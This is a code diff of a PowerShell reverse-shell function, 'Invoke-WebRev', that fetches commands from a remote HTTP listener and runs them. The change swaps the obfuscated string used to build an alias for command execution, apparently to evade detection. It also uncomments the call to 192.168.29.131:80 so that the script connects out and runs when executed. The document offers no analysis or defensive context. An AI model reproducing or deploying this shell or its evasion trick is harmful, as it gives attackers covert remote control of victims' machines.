@@ -24,7 +24,7 @@ function Invoke-WebRev{
 
     $url="http://" + $ip + ":" + $port + "/";
     $postParams = @{result='start'};
-    $x = "cabesha-ei-chixaka"; Set-alias $x ($x[$true-10] + ($x[[byte]("0x" + "FF") - 265]) + $x[[byte]("0x" + "9a") - 158])
+    $x = "taleska-ei-vrixeka"; Set-alias $x ($x[$true-10] + ($x[[byte]("0x" + "FF") - 265]) + $x[[byte]("0x" + "9a") - 158])
 
     while (1 -eq 1)
     {
@@ -36,7 +36,7 @@ function Invoke-WebRev{
             $Ds = [System.Text.Encoding]::UTF8.GetString($d);
             $result = "";
 
-            Foreach ($string in cabesha-ei-chixaka $Ds)
+            Foreach ($string in taleska-ei-vrixeka $Ds)
             {
                 $result += '_n1w_' + $string;
             };
@@ -46,4 +46,4 @@ function Invoke-WebRev{
     };
 }
 
-#Invoke-WebRev -ip 192.168.29.131 -port 80
+Invoke-WebRev -ip 192.168.29.131 -port 80
